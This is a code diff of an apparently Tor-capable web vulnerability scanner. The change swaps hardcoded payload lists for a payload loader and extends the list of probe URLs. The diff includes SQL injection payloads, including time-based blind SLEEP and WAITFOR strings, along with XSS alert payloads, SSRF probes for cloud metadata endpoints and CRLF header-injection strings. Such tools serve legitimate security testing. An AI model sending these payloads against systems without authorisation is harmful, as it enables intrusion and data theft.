@@ -8,45 +8,28 @@ import logging
 import requests
 import urllib.parse
 from modules.utils import tor_session
+from modules.bugbounty.payload_loader import load_payloads
 import re
 import time
 import warnings
 from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# Suppress BS4 XML-parsed-as-HTML warning — we intentionally use html.parser
 warnings.filterwarnings('ignore', category=XMLParsedAsHTMLWarning)
 
 logger = logging.getLogger(__name__)
 
-SQLI_ERROR_PAYLOADS  = ["'", "''", "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1"]
-SQLI_BLIND_PAYLOADS  = [
-    ("' AND SLEEP(4)--",        4.0, 'MySQL SLEEP'),
+# Load from proxy payloads → SecLists → hardcoded fallback
+SQLI_ERROR_PAYLOADS = load_payloads('sqli',  limit=30)
+XSS_PAYLOADS        = load_payloads('xss',   limit=25)
+SSRF_PAYLOADS       = load_payloads('ssrf')
+
+# Blind SQLi — time-based, structured tuples (not from files)
+SQLI_BLIND_PAYLOADS = [
+    ("' AND SLEEP(4)--",           4.0, 'MySQL SLEEP'),
     ("'; WAITFOR DELAY '0:0:4'--", 4.0, 'MSSQL WAITFOR'),
-    ("' AND pg_sleep(4)--",     4.0, 'PostgreSQL pg_sleep'),
-    ("' OR SLEEP(4)--",         4.0, 'MySQL OR SLEEP'),
-]
-XSS_PAYLOADS = [
-    "<script>alert(1)</script>",
-    "<img src=x onerror=alert(1)>",
-    "'><script>alert(1)</script>",
-    "<svg onload=alert(1)>",
-    "javascript:alert(1)",
-]
-XSS_DOM_PAYLOADS = [
-    "#<img src=x onerror=alert(1)>",
-    "#<script>alert(1)</script>",
-    "#javascript:alert(1)",
-]
-SSRF_PAYLOADS = [
-    "http://169.254.169.254/latest/meta-data/",
-    "http://127.0.0.1:80/",
-    "http://[::1]/",
-    "http://metadata.google.internal/computeMetadata/v1/",
-]
-HEADER_INJECT_PAYLOADS = [
-    "\r\nX-Injected: sentinel",
-    "\nX-Injected: sentinel",
+    ("' AND pg_sleep(4)--",        4.0, 'PostgreSQL pg_sleep'),
+    ("' OR SLEEP(4)--",            4.0, 'MySQL OR SLEEP'),
 ]
 
 SQLI_ERRORS = [
@@ -149,19 +132,33 @@ class VulnScanner:
                 targets.append(f"{base_url}{path}")
             elif path.endswith(('.php', '.asp', '.aspx', '.jsp', '.cfm')):
                 targets.append(f"{base_url}{path}?id=1")
-        # Fallback common targets
-        if not targets:
-            targets = [
-                f"{base_url}/search?q=test",
-                f"{base_url}/index.php?id=1",
-                f"{base_url}/?s=test",
-                f"{base_url}/page?id=1",
-                f"{base_url}/product?id=1",
-                f"{base_url}/article?id=1",
-                f"{base_url}/user?id=1",
-                f"{base_url}/news?id=1",
-            ]
-        return targets[:20]
+
+        # Common vulnerable param patterns
+        common = [
+            f"{base_url}/search?q=test",
+            f"{base_url}/index.php?id=1",
+            f"{base_url}/?s=test",
+            f"{base_url}/page?id=1",
+            f"{base_url}/product?id=1",
+            f"{base_url}/article?id=1",
+            f"{base_url}/user?id=1",
+            f"{base_url}/news?id=1",
+            f"{base_url}/item?id=1",
+            f"{base_url}/view?id=1",
+            f"{base_url}/show?id=1",
+            f"{base_url}/detail?id=1",
+            f"{base_url}/profile?id=1",
+            f"{base_url}/post?id=1",
+            # REST API patterns
+            f"{base_url}/api/search?q=test",
+            f"{base_url}/api/products?q=test",
+            f"{base_url}/rest/products/search?q=test",
+            f"{base_url}/api/v1/search?q=test",
+            f"{base_url}/api/v2/search?q=test",
+            f"{base_url}/api/users?id=1",
+        ]
+        targets += common
+        return list(dict.fromkeys(targets))[:25]  # deduplicate, max 25
 
     def _extract_forms(self, base_url: str, endpoints: list) -> list:
         """Crawl homepage + key pages and extract all HTML forms."""
